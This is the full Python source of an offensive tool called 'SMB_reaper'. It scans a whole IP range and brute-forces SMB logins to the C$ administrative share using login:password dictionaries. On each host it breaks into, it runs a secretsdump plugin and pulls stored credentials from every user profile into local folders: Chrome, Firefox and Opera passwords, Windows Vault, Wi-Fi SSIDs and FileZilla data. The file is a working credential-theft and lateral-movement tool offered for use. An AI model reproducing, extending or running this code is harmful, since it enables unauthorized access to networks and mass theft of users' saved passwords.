#####################################
#
#  Made by SBR
#  v0.8
#####################################

import os
import argparse
from tqdm import tqdm
import threading
from itertools import product
from passlib.hash import lmhash, nthash
from smb.SMBConnection import SMBConnection
from parser_method import Parser
from ipaddress import IPv4Network
from datetime import datetime
from plugins.secretsdump import Get_users_pass
from decrypt_method import Decrypt

#########static variables############
client_machine_name = 'PC'
server_name = 'PC'
denied_usr = ['Все пользователи', 'Public', 'All Users', 'Default', 'Default User', '.', '..']
data_folder = 'OUT'
startup = True
messages = []
Users = []
#####################################


def calculate_subnet(ip, cidr_mask):
    network = IPv4Network(ip + cidr_mask, strict=False)
    first_host = network.network_address + 1
    last_host = network.broadcast_address - 1
    return first_host, last_host


def Get_range_IP(IP):
    addr = IP.split('/')
    addr[1] = '/' + addr[1]
    return calculate_subnet(str(addr[0]), addr[1])


def logger(msg):
    global startup
    if startup:
        with open(f'{data_folder}/log.txt', 'a', encoding='utf-8') as fp:
            fp.write(f'\n\n\nStart time - {datetime.now()}\n{"%" * 50}')
        startup = False
    if len(msg) > 1:
        data = msg[1]
    else:
        data = msg[0]
    with open(f'{data_folder}/log.txt', 'a', encoding='utf-8') as fp:
        fp.write(f'\n{data}')
    if len(msg[0]) != 0:
        print(msg[0])


def parse_dict(path, flag):
    temp_locker = list()
    with open(path, 'r', encoding='utf-8') as file:
        data = set(filter(None, file.read().split('\n')))
    if not flag:
        for pare in data:
            temp_locker.extend(pare.split(':'))
        creds = set(product(temp_locker, repeat=2))
    else:
        creds = ['']
        creds.extend(list(data))
    return creds


def stop_scan():
    while True:
        if input('').lower == 'stop':
            break


def _decrypt(use_decrypt):
    if use_decrypt is not None:
        Decrypor = Decrypt(data_folder, use_decrypt)
        with open(f'{data_folder}/clear_passwords.txt', 'w', encoding='utf-8') as fp:
            fp.write(f'{Decrypor.Decryptor()}')


def main(share, domain, timeout, creds, target, use_decrypt, attempt=0):
    start, stop = Get_range_IP(target)

    if not os.path.exists(data_folder):
        os.mkdir(data_folder)

    while start <= stop:
        try:
            for pare in tqdm(creds, desc=f"Attempting({start})"):
                if not end_scan.is_alive():
                    _decrypt(use_decrypt)
                    return
                temp_pare = list(pare)
                conn = SMBConnection(temp_pare[0], temp_pare[1], client_machine_name, server_name, domain=domain,
                                     use_ntlm_v2=True,
                                     is_direct_tcp=True)
                conn.connect(str(start), 445, timeout=timeout)
                try:
                    folders = conn.listPath(share, '/Users', search=0x10)
                    for folder in folders:
                        if folder.filename not in denied_usr:
                            Users.append(folder.filename)
                    if not os.path.exists(f'{data_folder}/{str(start)}'):
                        os.mkdir(f'{data_folder}/{str(start)}')
                    with open(f'{data_folder}/{str(start)}/all_users.txt', 'w') as fp:
                        for i in Users:
                            fp.write(f'{i}\n')
                    logger([f'Authentication successful - {start} with login = "{temp_pare[0]}" and password = "{temp_pare[1]}"\n\nSTART DOWNLOADING from {start}\n{"-" * 50}'])
                    Get_users_pass(str(start), temp_pare[0], f'{lmhash.hash(temp_pare[1], encoding="utf-16le")}:{nthash.hash(temp_pare[1])}')
                    for i in range(len(Users)):
                        logger([f'\nDownloading for user - {Users[i]}\n{"=" * 50}'])
                        if not os.path.exists(f'{data_folder}/{str(start)}/{Users[i]}'):
                            os.mkdir(f'{data_folder}/{str(start)}/{Users[i]}')
                        parser = Parser('/Users/' + Users[i], f'{data_folder}/{str(start)}/{Users[i]}', conn, share)
                        logger(parser.SSID())
                        logger(parser.Chrome())
                        logger(parser.SYS_SSID())
                        logger(parser.Vault())
                        logger(parser.FireFox())
                        logger(parser.Opera())
                        logger(parser.FileZilla())
                        logger([f'\n{"=" * 50}'])
                    logger([f'\n{"-" * 50}'])
                    conn.close()
                    break
                except:
                    attempt += 1
                    logger(['', f'Authentication error - {start} (attempt {attempt} of {len(creds)})'])
                    conn.close()
        except:
            logger(['', f'Error connection - {start}'])
        start += 1
        attempt = 0
    _decrypt(use_decrypt)


if '__main__' == __name__:
    args = argparse.ArgumentParser(
        prog='SMB_reaper',
        description='This program collect useful credentials from SMB shares. The password and login in the dictionary are separated using ":"')
    args.add_argument('-u', action='store', type=str, help='SMB login')
    args.add_argument('-p', action='store', type=str, help='SMB password')
    args.add_argument('-domain', action='store', type=str, help='SMB domain', default='WORKGROUP')
    args.add_argument('-target', action='store', type=str, help="Host's IP with CIDR (192.168.0.1/24)", required=True)
    args.add_argument('-timeout', type=float, help='SMB connection delay in second', default=1)
    args.add_argument('--use-dict', action='store', type=str, help='Path to login:passwords dictionary combinations')
    args.add_argument('-share', action='store', type=str, help='Share name', default='C$')
    args.add_argument('-decrypt', action='store', type=str, help='Path to passwords dictionary')
    opt = args.parse_args()

    if opt.decrypt is None:
        passwords = None
    else:
        passwords = parse_dict(opt.decrypt, True)
    end_scan = threading.Thread(target=stop_scan,)
    end_scan.start()

    if opt.u and opt.p is not None and opt.use_dict is None:
        main(opt.share, opt.domain, opt.timeout, [(opt.u, opt.p)], opt.target, passwords)
    elif opt.use_dict is not None:
        main(opt.share, opt.domain, opt.timeout, parse_dict(opt.use_dict, False), opt.target, passwords)
    else:
        print('login/password not specified')